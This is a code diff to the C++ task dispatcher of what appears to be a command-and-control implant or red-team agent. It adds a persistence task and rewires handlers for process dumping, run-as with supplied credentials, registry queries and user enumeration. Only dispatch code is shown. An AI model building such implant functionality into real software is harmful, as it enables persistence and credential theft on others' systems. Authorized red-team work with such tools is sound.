@@ -251,6 +251,9 @@ namespace Handler
             case TASK_NET:
                 wTaskResult = Task::Net();
                 break;
+            case TASK_PERSIST:
+                wTaskResult = Task::Persist(pState);
+                break;
             case TASK_PROCDUMP:
                 wTaskResult = Task::Procdump(pState, Utils::Convert::UTF8Decode(args["pid"]));
                 break;
@@ -270,12 +273,13 @@ namespace Handler
             case TASK_REG_QUERY:
                 wTaskResult = Task::RegQuery(
                     pState,
-                    Utils::Convert::UTF8Decode(args["keyPath"]),
+                    Utils::Convert::UTF8Decode(args["rootkey"]),
+                    Utils::Convert::UTF8Decode(args["subkey"]),
                     Utils::Convert::UTF8Decode(args["recursive"]) == L"true"
                 );
                 break;
             case TASK_RM:
-                wTaskResult = Task::Rm(Utils::Convert::UTF8Decode(args["path"]));
+                wTaskResult = Task::Rm(pState, Utils::Convert::UTF8Decode(args["path"]));
                 break;
             case TASK_RMDIR:
                 wTaskResult = Task::Rmdir(Utils::Convert::UTF8Decode(args["path"]));
@@ -297,6 +301,7 @@ namespace Handler
                 break;
             case TASK_RUNAS:
                 wTaskResult = Task::RunAs(
+                    pState,
                     Utils::Convert::UTF8Decode(args["username"]),
                     Utils::Convert::UTF8Decode(args["password"]),
                     Utils::Convert::UTF8Decode(args["cmd"])
@@ -343,13 +348,13 @@ namespace Handler
                 );
                 break;
             case TASK_USER_LS:
-                wTaskResult = Task::Users();
+                wTaskResult = Task::Users(pState);
                 break;
             case TASK_WHOAMI:
-                wTaskResult = Task::Whoami();
+                wTaskResult = Task::Whoami(pState);
                 break;
             case TASK_WHOAMI_PRIV:
-                wTaskResult = Task::WhoamiPriv();
+                wTaskResult = Task::WhoamiPriv(pState);
                 break;
             default:
                 wTaskResult = L"Error: Invalid task.";
